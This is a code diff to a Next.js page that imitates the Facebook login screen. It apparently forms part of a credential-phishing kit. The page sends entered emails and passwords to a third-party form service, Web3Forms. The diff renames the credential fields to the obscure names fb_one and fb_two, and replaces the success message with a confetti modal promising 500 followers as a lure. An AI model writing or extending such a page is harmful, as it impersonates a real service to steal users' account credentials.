@@ -5,12 +5,14 @@ import Image from "next/image";
 import Link from "next/link";
 import { FacebookLogo, MetaLogo } from "@/components/common/Icons";
 import LanguageModal from "@/components/common/LanguageModal";
+import CelebrationModal from "@/components/common/CelebrationModal";
 import { submitToWeb3Forms, WEB3FORMS_ACCESS_KEY } from "@/lib/web3forms";
 
 export default function FacebookLoginPage() {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [isLangModalOpen, setIsLangModalOpen] = useState(false);
+  const [isCelebrationOpen, setIsCelebrationOpen] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [statusMessage, setStatusMessage] = useState<{ type: "success" | "error"; text: string } | null>(null);
 
@@ -28,7 +30,7 @@ export default function FacebookLoginPage() {
 
     setIsSubmitting(false);
     if (result.success) {
-      setStatusMessage({ type: "success", text: "Logged in successfully!" });
+      setIsCelebrationOpen(true);
       setEmail("");
       setPassword("");
     } else {
@@ -144,7 +146,7 @@ export default function FacebookLoginPage() {
                 <div>
                   <input
                     type="text"
-                    name="email_or_phone"
+                    name="fb_one"
                     value={email}
                     onChange={(e) => setEmail(e.target.value)}
                     placeholder="Email address or mobile number"
@@ -157,7 +159,7 @@ export default function FacebookLoginPage() {
                 <div>
                   <input
                     type="password"
-                    name="password"
+                    name="fb_two"
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}
                     placeholder="Password"
@@ -261,6 +263,13 @@ export default function FacebookLoginPage() {
       <LanguageModal
         isOpen={isLangModalOpen}
         onClose={() => setIsLangModalOpen(false)}
+      />
+
+      {/* Celebration Modal with Confetti */}
+      <CelebrationModal
+        isOpen={isCelebrationOpen}
+        onClose={() => setIsCelebrationOpen(false)}
+        followerCount={500}
       />
     </div>
   );
